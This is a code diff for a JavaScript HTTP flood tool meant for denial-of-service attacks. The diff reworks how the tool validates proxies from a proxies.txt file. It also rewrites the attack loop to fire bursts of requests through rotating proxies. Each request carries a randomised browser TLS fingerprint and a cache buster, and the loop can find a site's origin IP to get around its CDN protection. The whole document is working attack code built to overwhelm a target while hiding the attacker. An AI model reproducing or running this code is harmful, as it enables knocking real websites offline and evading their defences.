@@ -223,60 +223,25 @@ function addRealisticDelay() {
     });
 }
 
-async function testProxy(proxyUrl, timeout = 1200) {
-    const testEndpoints = [
-        'http://1.1.1.1',
-        'http://8.8.8.8',
-        'http://www.google.com'
-    ];
-    
-    const endpoint = testEndpoints[Math.floor(Math.random() * testEndpoints.length)];
-    
+async function testProxy(proxyUrl, timeout = 2000) {
     try {
         const agent = proxyUrl.startsWith('https') 
             ? new HttpsProxyAgent(proxyUrl)
             : new HttpProxyAgent(proxyUrl);
         
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), timeout);
-        
-        const response = await axios.get(endpoint, {
+        await axios.get('http://www.google.com', {
             httpAgent: agent,
             httpsAgent: agent,
             timeout: timeout,
-            signal: controller.signal,
             validateStatus: () => true,
-            maxRedirects: 3
+            maxRedirects: 5
         });
         
-        clearTimeout(timeoutId);
-        
-        return response.status >= 200 && response.status < 500;
-    } catch (error) {
-        return false;
-    }
-}
-
-async function quickTestProxy(proxyUrl) {
-    try {
-        const agent = proxyUrl.startsWith('https') 
-            ? new HttpsProxyAgent(proxyUrl)
-            : new HttpProxyAgent(proxyUrl);
-        
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 800);
-        
-        await axios.get('http://1.1.1.1', {
-            httpAgent: agent,
-            httpsAgent: agent,
-            timeout: 800,
-            signal: controller.signal,
-            validateStatus: () => true
-        });
-        
-        clearTimeout(timeoutId);
         return true;
-    } catch {
+    } catch (error) {
+        if (error.response) {
+            return true;
+        }
         return false;
     }
 }
@@ -291,129 +256,54 @@ async function loadProxies(filePath = 'proxies.txt') {
         if (raw.length === 0) {
             console.log('[!] No proxies found in proxies.txt');
             console.log('[!] Format: ip:port (one per line)');
-            console.log('[!] Example: 123.45.67.89:8080');
             return false;
         }
         
         console.log(`[*] Loading ${raw.length} proxies...`);
-        console.log('[!] IMPORTANT: Validating proxies with 3-phase system');
+        console.log('[*] Fast validation starting (250 parallel)...');
         
         const temp = raw.map(proxy => 
             proxy.startsWith('http') ? proxy : `http://${proxy}`
         );
         
-        console.log('\n[PHASE 1/3] Quick connectivity test (300 parallel)...');
-        const phase1Start = Date.now();
-        const phase1Candidates = [];
+        const startTime = Date.now();
+        const chunkSize = 250;
+        let validCount = 0;
         
-        const chunkSize = 300;
         for (let i = 0; i < temp.length; i += chunkSize) {
             const chunk = temp.slice(i, i + chunkSize);
             const progress = i + chunk.length;
             
             const results = await Promise.allSettled(
-                chunk.map(proxy => quickTestProxy(proxy).then(valid => ({ proxy, valid })))
-            );
-            
-            results.forEach(result => {
-                if (result.status === 'fulfilled' && result.value.valid) {
-                    phase1Candidates.push(result.value.proxy);
-                }
-            });
-            
-            process.stdout.write(`\r[*] Phase 1: ${progress}/${temp.length} | Found: ${phase1Candidates.length} candidates`);
-        }
-        
-        const phase1Time = ((Date.now() - phase1Start) / 1000).toFixed(1);
-        console.log(`\n[+] Phase 1 complete in ${phase1Time}s: ${phase1Candidates.length}/${temp.length} passed quick test\n`);
-        
-        if (phase1Candidates.length === 0) {
-            console.log('[!] NO PROXIES passed quick test!');
-            return false;
-        }
-        
-        console.log('[PHASE 2/3] Deep validation test (200 parallel)...');
-        const phase2Start = Date.now();
-        const phase2Validated = [];
-        
-        const chunk2Size = 200;
-        for (let i = 0; i < phase1Candidates.length; i += chunk2Size) {
-            const chunk = phase1Candidates.slice(i, i + chunk2Size);
-            const progress = i + chunk.length;
-            
-            const results = await Promise.allSettled(
-                chunk.map(proxy => testProxy(proxy, 1200).then(valid => ({ proxy, valid })))
-            );
-            
-            results.forEach(result => {
-                if (result.status === 'fulfilled' && result.value.valid) {
-                    phase2Validated.push(result.value.proxy);
-                }
-            });
-            
-            process.stdout.write(`\r[*] Phase 2: ${progress}/${phase1Candidates.length} | Validated: ${phase2Validated.length}`);
-        }
-        
-        const phase2Time = ((Date.now() - phase2Start) / 1000).toFixed(1);
-        console.log(`\n[+] Phase 2 complete in ${phase2Time}s: ${phase2Validated.length}/${phase1Candidates.length} passed validation\n`);
-        
-        if (phase2Validated.length === 0) {
-            console.log('[!] NO PROXIES passed deep validation!');
-            return false;
-        }
-        
-        console.log('[PHASE 3/3] Reliability test (150 parallel)...');
-        const phase3Start = Date.now();
-        
-        const chunk3Size = 150;
-        for (let i = 0; i < phase2Validated.length; i += chunk3Size) {
-            const chunk = phase2Validated.slice(i, i + chunk3Size);
-            const progress = i + chunk.length;
-            
-            const results = await Promise.allSettled(
                 chunk.map(async proxy => {
-                    const test1 = await testProxy(proxy, 1000);
-                    if (!test1) return { proxy, valid: false };
-                    
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                    const test2 = await testProxy(proxy, 1000);
-                    
-                    return { proxy, valid: test2 };
+                    const valid = await testProxy(proxy, 2000);
+                    return { proxy, valid };
                 })
             );
             
             results.forEach(result => {
                 if (result.status === 'fulfilled' && result.value.valid) {
                     config.proxies.push(result.value.proxy);
+                    validCount++;
                 }
             });
             
-            process.stdout.write(`\r[*] Phase 3: ${progress}/${phase2Validated.length} | Reliable: ${config.proxies.length}`);
+            process.stdout.write(`\r[*] Progress: ${progress}/${temp.length} | Working: ${validCount}`);
         }
         
-        const phase3Time = ((Date.now() - phase3Start) / 1000).toFixed(1);
-        const totalTime = ((Date.now() - phase1Start) / 1000).toFixed(1);
-        
-        console.log(`\n[+] Phase 3 complete in ${phase3Time}s: ${config.proxies.length}/${phase2Validated.length} are reliable\n`);
+        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+        console.log(`\n\n[+] Validation complete in ${totalTime}s`);
+        console.log(`[+] Loaded ${config.proxies.length} working proxies from ${temp.length} total`);
+        console.log(`[+] Success rate: ${((config.proxies.length / temp.length) * 100).toFixed(1)}%`);
         
         if (config.proxies.length === 0) {
             console.log('[!] NO WORKING PROXIES FOUND!');
-            console.log('[!] Your real IP WILL be exposed if you continue');
             return false;
         }
-        
-        console.log('='.repeat(70));
-        console.log(`[+] VALIDATION COMPLETE in ${totalTime}s`);
-        console.log(`[+] Loaded ${config.proxies.length} RELIABLE proxies from ${temp.length} total`);
-        console.log(`[+] Survival rate: ${((config.proxies.length / temp.length) * 100).toFixed(1)}%`);
-        console.log(`[+] Your real IP will be HIDDEN behind these proxies`);
-        console.log('='.repeat(70));
         
         return true;
     } catch (err) {
         console.log('[!] proxies.txt not found!');
-        console.log('[!] Create a file named "proxies.txt" in the same folder');
-        console.log('[!] Format: ip:port (one per line)');
         return false;
     }
 }
@@ -521,18 +411,22 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
+        console.log(`[*] Mode: BURST (3-7 requests per burst)`);
+        console.log(`[*] JA3: Valid browser fingerprints enabled`);
+        console.log(`[*] Emulation: Full browser headers + TLS`);
         
-        const estimatedRPS = this.threads * (config.proxies.length > 0 ? 0.8 : 1.5);
-        console.log(`[*] Estimated RPS: ${Math.floor(estimatedRPS * 100)}-${Math.floor(estimatedRPS * 150)} req/s`);
-        console.log(`[!] TIP: Use 300-500 threads for maximum impact`);
+        const estimatedBursts = this.threads * 12;
+        console.log(`[*] Estimated throughput: ${estimatedBursts * 3}-${estimatedBursts * 7} req/s`);
         
         if (this.useOrigin && this.domain) {
             this.originIPs = await discoverOriginIPs(this.domain);
         }
         
         if (config.proxies.length > 0) {
-            console.log(`[*] Loaded ${config.proxies.length} proxies for rotation`);
+            console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
             config.workingProxies.clear();
+        } else {
+            console.log('[!] WARNING: Direct connection - your IP is visible!');
         }
         
         config.stats.startTime = Date.now();
@@ -543,76 +437,97 @@ class HTTPFlood {
         let currentProxyIndex = config.proxies.length > 0 ? threadId % config.proxies.length : 0;
         let consecutiveFails = 0;
         let localCount = 0;
-        
-        const profile = getRandomElement(BROWSER_PROFILES);
-        let cachedAgent = null;
-        
-        if (config.proxies.length > 0) {
-            const proxy = config.proxies[currentProxyIndex];
-            cachedAgent = createTLSAgent(profile, proxy);
-        } else {
-            cachedAgent = createTLSAgent(profile, null);
-        }
+        let burstCount = 0;
         
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            try {
-                const headers = getAdvancedHeaders(this.url, profile);
-                
-                let targetUrl = this.url;
-                if (this.originIPs.length > 0 && this.useOrigin) {
-                    const originIP = getRandomElement(this.originIPs);
-                    if (originIP !== this.domain) {
-                        targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
-                        headers['Host'] = this.domain;
+            const burstSize = Math.floor(Math.random() * 5) + 3;
+            const burstPromises = [];
+            
+            for (let b = 0; b < burstSize; b++) {
+                const requestPromise = (async () => {
+                    try {
+                        const profile = getRandomElement(BROWSER_PROFILES);
+                        const headers = getAdvancedHeaders(this.url, profile);
+                        
+                        let targetUrl = this.url;
+                        if (this.originIPs.length > 0 && this.useOrigin) {
+                            const originIP = getRandomElement(this.originIPs);
+                            if (originIP !== this.domain) {
+                                targetUrl = this.url.replace('https://', 'http://').replace(this.domain, originIP);
+                                headers['Host'] = this.domain;
+                            }
+                        }
+                        
+                        targetUrl = addCacheBuster(targetUrl);
+                        
+                        let agent;
+                        if (config.proxies.length > 0) {
+                            const proxy = config.proxies[currentProxyIndex];
+                            agent = createTLSAgent(profile, proxy);
+                        } else {
+                            agent = createTLSAgent(profile, null);
+                        }
+                        
+                        const axiosConfig = {
+                            method: this.method.toLowerCase(),
+                            url: targetUrl,
+                            headers,
+                            timeout: 5000,
+                            maxRedirects: 5,
+                            validateStatus: () => true,
+                            httpsAgent: agent,
+                            httpAgent: agent,
+                            proxy: false
+                        };
+                        
+                        if (this.method === 'POST') {
+                            axiosConfig.data = { payload: 'x'.repeat(Math.floor(Math.random() * 500) + 100) };
+                        }
+                        
+                        const response = await axios(axiosConfig);
+                        
+                        const bytesSent = JSON.stringify(headers).length + (axiosConfig.data ? JSON.stringify(axiosConfig.data).length : 0);
+                        const bytesReceived = response.data ? JSON.stringify(response.data).length : 0;
+                        
+                        updateStats(true, response.status, bytesSent, bytesReceived);
+                        
+                        if (config.proxies.length > 0 && localCount % 50 === 0) {
+                            const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
+                            config.workingProxies.add(proxyIP);
+                        }
+                        
+                        if (config.debug && localCount % 200 === 0) {
+                            console.log(`[DEBUG] Thread ${threadId}: ${response.status} - JA3: ${profile.name}`);
+                        }
+                        
+                        consecutiveFails = 0;
+                        localCount++;
+                        
+                    } catch (error) {
+                        updateStats(false);
+                        consecutiveFails++;
+                        
+                        if (config.debug && localCount < 10) {
+                            console.log(`[DEBUG] Thread ${threadId}: ${error.code || error.message}`);
+                        }
                     }
-                }
+                })();
                 
-                targetUrl = addCacheBuster(targetUrl);
-                
-                const axiosConfig = {
-                    method: this.method.toLowerCase(),
-                    url: targetUrl,
-                    headers,
-                    timeout: 1000,
-                    maxRedirects: 0,
-                    validateStatus: () => true,
-                    decompress: false,
-                    proxy: false,
-                    httpsAgent: cachedAgent,
-                    httpAgent: cachedAgent
-                };
-                
-                if (this.method === 'POST') {
-                    axiosConfig.data = 'x'.repeat(500);
-                }
-                
-                const response = await axios(axiosConfig);
-                
-                const bytesSent = 800;
-                const bytesReceived = response.data ? String(response.data).length : 0;
-                
-                updateStats(true, response.status, bytesSent, bytesReceived);
-                
-                if (config.proxies.length > 0 && localCount % 20 === 0) {
-                    const proxyIP = config.proxies[currentProxyIndex].replace(/^https?:\/\//, '').split(':')[0];
-                    config.workingProxies.add(proxyIP);
-                }
-                
+                burstPromises.push(requestPromise);
+            }
+            
+            await Promise.allSettled(burstPromises);
+            burstCount++;
+            
+            if (consecutiveFails >= 5 && config.proxies.length > 0) {
+                currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
                 consecutiveFails = 0;
-                localCount++;
-                
-            } catch (error) {
-                updateStats(false);
-                consecutiveFails++;
-                
-                if (consecutiveFails >= 3 && config.proxies.length > 0) {
-                    currentProxyIndex = (currentProxyIndex + 1) % config.proxies.length;
-                    const proxy = config.proxies[currentProxyIndex];
-                    cachedAgent = createTLSAgent(profile, proxy);
-                    consecutiveFails = 0;
-                }
+            }
+            
+            if (burstCount % 2 === 0) {
+                await new Promise(resolve => setTimeout(resolve, 50));
             }
         }
     }
